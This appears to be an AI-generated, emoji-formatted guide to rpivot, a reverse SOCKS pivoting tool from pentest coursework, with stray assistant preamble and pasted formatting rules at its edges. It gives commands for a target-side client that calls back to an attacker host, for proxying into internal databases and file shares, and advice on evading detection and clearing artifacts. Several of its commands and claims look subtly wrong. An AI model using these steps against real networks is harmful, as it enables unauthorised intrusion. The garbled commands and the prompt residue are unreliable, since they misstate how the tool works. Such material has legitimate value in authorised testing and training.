 emojis in ALL H1 and H2 headers have been applied, and other formatting rules have been adhered to. Here is the updated content:

---

# 🛰️ Rpivot Documentation

Rpivot is a Python-based pivoting tool designed for reverse connections, particularly useful in environments where initiating outbound connections is restricted or monitored. This document covers setup, operational considerations, security concerns, and practical usage scenarios.

## 💡 Introduction to Rpivot
[!ABSTRACT] Rpivot enables pivoting through SOCKS proxies by setting up a reverse connection between an attacker's machine and a target within the internal network. It supports NTLM authentication for corporate proxy environments and runs on Python 2.7.

## 🛠️ Setup

### 🔧 Installation Steps

#### ✨ Prerequisites
[!INFO] Ensure Python 2.7 is installed.
```bash
python --version # Should output Python 2.7.x
```

#### ⚙️ Install Rpivot from GitHub
Clone the rpivot repository and install dependencies:
```bash
git clone https://github.com/klsecservices/rpivot.git
cd rpivot
pip install -r requirements.txt
```
[!WARNING] Ensure you have Python 2.7 installed as it is required for rpivot to function.
```bash
sudo apt-get install python2.7
```

### 🔗 Establishing Pivoting Connections

#### 👉 Run the Server Side
Start the server on your local machine or attacker's host:
```python
python server.py -p 9050 --auth NTLM
```
[!SUCCESS] The server listens for connections from within the target network.

#### 🔐 Configure the Client Side
Deploy and configure the client on a target system to connect back to your rpivot server.
```bash
python client.py -s <attacker_ip>:9050 --lport 9999
```

[!NOTE] Replace `<attacker_ip>` with the IP address of the attacker's machine.

### 🛠️ Alternative Methods

#### 🔌 Using SSH for File Transfer
If Python is not available on the target, use SSH to transfer rpivot:
```bash
scp client.py ubuntu@target_ip:/tmp/
```

## ⚙️ Operational Considerations

### 💡 Advantages of Rpivot
1. **Reverse Connection** - bypasses inbound firewall restrictions.
2. **NTLM Support** - works with corporate proxy authentication.
3. **Multiple Clients** - supports multiple pivot points simultaneously.
4. **Python-Based** - cross-platform compatibility.
5. **Simple Setup** - minimal configuration required.

### ⚠️ Limitations
1. **Python 2.7 Dependency** - legacy Python version.
2. **Performance Overhead** - slower compared to compiled tools.
3. **Detection Risks** - clear process names and network patterns.
4. **Maintenance Concerns** - Python 2.7 EOL and security issues.
5. **Limited Protocols** - SOCKS4 only (no SOCKS5 features).

### 🔒 Security Considerations
1. **Process Visibility** - python processes visible in `ps`.
2. **Network Signatures** - predictable traffic patterns.
3. **Log Traces** - SSH transfers and connections logged.
4. **Python 2.7 Vulnerabilities** - known security issues.
5. **Clear Text Configuration** - command line arguments visible.

## 🧮 Alternative Tools Comparison

### ⏬ Rpivot vs Other Pivoting Tools

| **Tool** | **Language** | **Direction** | **Auth Support** | **Performance** |
|----------|--------------|---------------|------------------|-----------------|
| **Rpivot** | Python 2.7 | Reverse | NTLM | Medium |
| **sshuttle** | Python 3 | Forward | SSH keys | High |
| **Chisel** | Go | Both | None | High |
| **ligolo-ng** | Go | Reverse | TLS | High |
| **SSH** | C | Forward | Keys/password | High |

### 🏷️ When to Use Rpivot
✅ **Corporate Environments**: with NTLM proxies  
✅ **Reverse Connections**: needed for firewall bypass  
✅ **Multiple Pivot Points**: required  
✅ **Python Available**: on target systems  
✅ **SOCKS Tunneling**: sufficient for needs  

### 🔴 When NOT to Use Rpivot
❌ **Python 2.7 Unavailable**: on targets  
❌ **High Performance**: requirements  
❌ **Stealth Operations**: (process detection risk)  
❌ **Modern Protocols**: needed (HTTP/3, etc.)  
❌ **Long-Term Persistence**: (maintenance overhead)

---

## 📚 Integration Examples

### 🔒 Web Application Testing
```bash
# Burp Suite through Rpivot
proxychains burpsuite

# Configure Burp proxy settings:
# Proxy: 127.0.0.1:8080
# Upstream proxy: 127.0.0.1:9050 (SOCKS4)
```

### 🔐 Database Access
```bash
# MySQL connection through tunnel
proxychains mysql -h 172.16.5.135 -u admin -p

# PostgreSQL access
proxychains psql -h 172.16.5.135 -U postgres -d database
```

### 🗂️ File Share Access
```bash
# SMB enumeration
proxychains smbclient -L //172.16.5.135

# NFS mounting
proxychains showmount -e 172.16.5.135
```

---

## 🔍 Monitoring and Logging

### 🏷 Server-Side Monitoring
```bash
# Monitor rpivot server connections
tail -f server.log

# Check SOCKS proxy usage
netstat -an | grep :9050

# Monitor client connections
lsof -i :9999
```

### 📐 Client-Side Monitoring
```bash
# Monitor client connection status
ps aux | grep client.py

# Check network connections
netstat -an | grep 9999

# Monitor resource usage
top -p $(pgrep python2.7)
```

### 🔍 Traffic Analysis
```bash
# Capture rpivot traffic
tcpdump -i any port 9999 or port 9050

# Analyze SOCKS traffic
wireshark -f "port 9050"
```

---

## 📘 Best Practices

### ⚙️ Operational Guidelines
1. **Pre-stage Python 2.7** - ensure availability before engagement.
2. **Test Connectivity** - verify network paths before deployment.
3. **Use Non-Standard Ports** - avoid default port detection.
4. **Monitor Connections** - track client status and performance.
5. **Clean Up Processes** - terminate sessions properly.

### 🔒 Security Recommendations
1. **Encrypt Transfers** - use SSH/HTTPS for rpivot deployment.
2. **Rotate Ports** - change default ports for each engagement.
3. **Limit Exposure Time** - minimize active tunnel duration.
4. **Clear Artifacts** - remove rpivot files after use.
5. **Monitor Logs** - watch for detection indicators.

### ⚡ Performance Optimization
1. **Single-Purpose Clients** - dedicate clients to specific tasks.
2. **Batch Operations** - minimize interactive session overhead.
3. **Compress Transfers** - use efficient data transfer methods.
4. **Monitor Bandwidth** - track and limit usage patterns.
5. **Connection Pooling** - reuse established tunnels.

---

## 📚 References

- **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Page 10
- **Rpivot GitHub**: [Official Repository](https://github.com/klsecservices/rpivot)
- **Python 2.7 Documentation**: [Legacy Python Docs](https://docs.python.org/2.7/)
- **SOCKS Protocol**: [RFC 1928 - SOCKS Version 5](https://tools.ietf.org/html/rfc1928)
- **NTLM Authentication**: [Microsoft NTLM Documentation](https://docs.microsoft.com/en-us/windows/security/) 

---

STRICT FORMATTING RULES:
1. DO NOT summarize, shorten, or remove ANY technical details, commands, IPs, or explanations.
2. Use emojis in ALL H1 and H2 headers (e.g., `# 🛰️ Title`, `## 🔍 Subtitle`).
3. STRICTLY APPLY THE CALLOUT SYSTEM based on context:
   - Use `[!ABSTRACT]`, `[!TLDR]`, `[!INFO]`, `[!NOTE]`, `[!CHECK]`, `[!SUCCESS]`, `[!WARNING]`, `[!CAUTION]`, `[!DANGER]`, `[!FAILURE]`, and `[!ERROR]` as appropriate.
4. Separate major logical sections with horizontal rules (`---`).
5. Use clean Markdown tables where appropriate.
6. ALWAYS use language tags for code blocks (e.g., ```bash, ```text, ```python).